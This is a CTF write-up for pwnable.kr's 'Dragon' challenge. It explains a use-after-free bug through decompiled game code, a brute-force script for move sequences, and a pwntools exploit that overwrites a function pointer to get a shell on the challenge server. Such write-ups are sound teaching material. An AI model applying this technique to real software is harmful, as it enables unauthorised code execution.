---
layout: single
title: Dragon - pwnable.kr
excerpt: "In today's story, we'll examine how to exploit an UAF (Use-After-Free) vulnerability through Dragon challenge. According to Pwnable.kr's rules, I'll mask some part of my solution because I don't wanna spoil it too much."
date: 2020-06-26
classes: wide
header:
  teaser: /assets/images/dragon-challenge-pwnable/logo.jpg
  teaser_home_page: true
categories: 
  - exploiting
  - reverse-engineering
tags:
  - pwnable.kr
  - Dragon
---

![How To Kill A Dragon!](/assets/images/dragon-challenge-pwnable/logo.jpg)

In today's story, we'll examine how to exploit an UAF (Use-After-Free) vulnerability through Dragon challenge. According to Pwnable.kr's rules, I'll mask some part of my solution because I don't wanna spoil it too much.
> I made a RPG game for my little brother.  
> But to trick him, I made it impossible to win.  
> I hope he doesn't get too angry with me :P!Author : rookiss  
> Download : [http://pwnable.kr/bin/dragon](http://pwnable.kr/bin/dragon) Running at : nc pwnable.kr 9004

 After analyzing the binary file in IDA, I found SecretLevel function that could run `/bin/sh`, but there was something wrong.

```c
unsigned int SecretLevel()
{
  char input_string; // [esp+12h] [ebp-16h]
  unsigned int v2; // [esp+1Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  printf("Welcome to Secret Level!\nInput Password : ");
  __isoc99_scanf("%10s", &input_string);
  if ( strcmp(&input_string, "Nice_Try_But_The_Dragons_Won't_Let_You!") )
  {
    puts("Wrong!\n");
    exit(-1);
  }
  system("/bin/sh");
  return __readgsdword(0x14u) ^ v2;
}
```

As you can see, the length of input is 10, but the string that will be compared is 39. It's a further signal to us, we need to look for a place in code where we could alter the flow of execution to `system('/bin/sh')` . So far, the only solution is to fight and kill the Dragon. As can be seen from the FightDragon function source \(that I've given below\), there are two types of Dragons and Heroes. The mama dragon's HP\(Health Point\) value is more than baby dragon, but the baby has more damage point. Keep in mind that the Dragon Structure length is 16byte, the HP variable is Signed Integer and 1byte.

```c
void __cdecl FightDragon(int a1)
{
  char v1; // al
  void *uName; // ST1C_4
  int resAttack; // [esp+10h] [ebp-18h]
  Struct_Hero *Hero; // [esp+14h] [ebp-14h]
  Struct_Dragon *Dragon; // [esp+18h] [ebp-10h]

  Hero = malloc(0x10u);
  Dragon = malloc(16u);
  v1 = Count++;
  if ( v1 & 1 )
  {
    Dragon->ID = 1;
    Dragon->HP = 80;
    Dragon->Life_Regeneration = 4;
    *&Dragon->Damage = 10;
    Dragon->Function = PrintMonsterInfo;
    puts("Mama Dragon Has Appeared!");
  }
  else
  {
    Dragon->ID = 0;
    Dragon->HP = 50;
    Dragon->Life_Regeneration = 5;
    *&Dragon->Damage = 30;
    Dragon->Function = PrintMonsterInfo;
    puts("Baby Dragon Has Appeared!");
  }
  if ( a1 == 1 )
  {
    Hero->ID = 1;
    Hero->HP = 42;
    Hero->MP = 50;
    Hero->Function = PrintPlayerInfo;
    resAttack = PriestAttack(Hero, Dragon);
  }
  else
  {
    if ( a1 != 2 )
      return;
    Hero->ID = 2;
    Hero->HP = 50;
    Hero->MP = 0;
    Hero->Function = PrintPlayerInfo;
    resAttack = KnightAttack(Hero, Dragon);
  }
  if ( resAttack )
  {
    puts("Well Done Hero! You Killed The Dragon!");
    puts("The World Will Remember You As:");
    uName = malloc(0x10u);
    __isoc99_scanf("%16s", uName);
    puts("And The Dragon You Have Defeated Was Called:");
    (Dragon->Function)(Dragon);
  }
  else
  {
    puts("\nYou Have Been Defeated!");
  }
  free(Hero);
}
```

 The Priest Hero's health point is less than Knight Hero's, but he has Magic or Mana Point. It's obviously, there is no chance to kill the Dragon in KnightAttack function, but there is a chance in PriestAttack because of Magic/Mana. At the end of the function we can see, the Dragon is killed and the memory that was allocated to Dragon structure will be freed and also `return 1;`if `Dragon->HP > 0`isn't met.

```c
int __cdecl KnightAttack(Struct_Hero *Hero, Struct_Dragon *Dragon)
{
  int v2; // eax

  do
  {
    (Dragon->Function)(Dragon);
    (Hero->Function)(Hero);
    v2 = GetChoice();
    if ( v2 == 1 )
    {
      printf("Crash Deals %d Damage To The Dragon!\n", 20);
      Dragon->HP -= 20;
      printf("But The Dragon Deals %d Damage To You!\n", Dragon->Damage);
      Hero->HP -= Dragon->Damage;
      printf("And The Dragon Heals %d HP!\n", Dragon->Life_Regeneration);
      Dragon->HP += Dragon->Life_Regeneration;
    }
    else if ( v2 == 2 )
    {
      printf("Frenzy Deals %d Damage To The Dragon!\n", 40);
      Dragon->HP -= 40;
      puts("But You Also Lose 20 HP...");
      Hero->HP -= 20;
      printf("And The Dragon Deals %d Damage To You!\n", Dragon->Damage);
      Hero->HP -= Dragon->Damage;
      printf("Plus The Dragon Heals %d HP!\n", Dragon->Life_Regeneration);
      Dragon->HP += Dragon->Life_Regeneration;
    }
    if ( Hero->HP <= 0 )
    {
      free(Dragon);
      return 0;
    }
  }
  while ( Dragon->HP > 0 );
  free(Dragon);
  return 1;
}

int __cdecl PriestAttack(Struct_Hero *Hero, Struct_Dragon *Dragon)
{
  int v2; // eax

  do
  {
    (Dragon->Function)(Dragon);
    (Hero->Function)(Hero);
    v2 = GetChoice();
    switch ( v2 )
    {
      case 2:                                   // [ 2 ] Clarity [ Cost : 0 MP ]
        puts("Clarity! Your Mana Has Been Refreshed");
        Hero->MP = 50;
        printf("But The Dragon Deals %d Damage To You!\n", Dragon->Damage);
        Hero->HP -= Dragon->Damage;
        printf("And The Dragon Heals %d HP!\n", Dragon->Life_Regeneration);
        Dragon->HP += Dragon->Life_Regeneration;
        break;
      case 3:                                   // [ 3 ] HolyShield [ Cost: 25 MP ]
        if ( Hero->MP <= 24 )
        {
          puts("Not Enough MP!");
        }
        else
        {
          puts("HolyShield! You Are Temporarily Invincible...");
          printf("But The Dragon Heals %d HP!\n", Dragon->Life_Regeneration);
          Dragon->HP += Dragon->Life_Regeneration;
          Hero->MP -= 25;
        }
        break;
      case 1:                                   // [ 1 ] Holy Bolt [ Cost : 10 MP ]
        if ( Hero->MP <= 9 )
        {
          puts("Not Enough MP!");
        }
        else
        {
          printf("Holy Bolt Deals %d Damage To The Dragon!\n", 20);
          Dragon->HP -= 20;
          Hero->MP -= 10;
          printf("But The Dragon Deals %d Damage To You!\n", Dragon->Damage);
          Hero->HP -= Dragon->Damage;
          printf("And The Dragon Heals %d HP!\n", Dragon->Life_Regeneration);
          Dragon->HP += Dragon->Life_Regeneration;
        }
        break;
    }
    if ( Hero->HP <= 0 )
    {
      free(Dragon);
      return 0;
    }
  }
  while ( Dragon->HP > 0 );
  free(Dragon);
  return 1;
}
```

At the end of the FightDragon function, if reAttack variable is positive, 16byte memory is allocated for `uName` variable. Prior to that, Dragon Structure \(16byte\) has freed, but after you enter a string for `uName` variable, `(Dragon->Function) (Dragon);` is called, and eventually, a UAF bug occurs and we can overwrite `Dragon->Function` pointer by `uName` value.

well, I've written a brute-force script to find possible scenario to fight and kill the mama Dragon. `check` function is similar PriestAttack function.

```py
def main():
    chars = "123"
    for length in range(1,15):
        attempts = product(chars, repeat=length)
        for item in attempts:
          if (check( ''.join(item) )):
              print "Seq :\t", flag

    print "Finish"
    """
    Result:
    Seq : 233233233***
    Seq : 323233233***
    Seq : 323323233***
    Seq : 323323323***
    Seq : 323323323***
    Seq : 332233233***
    Seq : 332323233***
    """

if __name__ == '__main__':
    main()
```

and here is my solution:

```py
from pwn import *


r = remote('pwnable.kr',9004)

seq = '111123323323****'

for item in seq:
    r.sendline(item)
    r.recv(1024)

r.sendline('\xbf\x8d\x04\x08')
r.recv(1024)
r.interactive()

"""
root@:~/Pwnable/Dragon# python dragon-sol.py
[+] Opening connection to pwnable.kr on port 9004: Done
[*] Switching to interactive mode
And The Dragon You Have Defeated Was Called:
$ ls
dragon
flag
log
super.pl
$ cat flag
MaMa, Gandhi *************
$ 
[*] Interrupted
[*] Closed connection to pwnable.kr port 9004
root@:~/Pwnable/Dragon#
"""
```
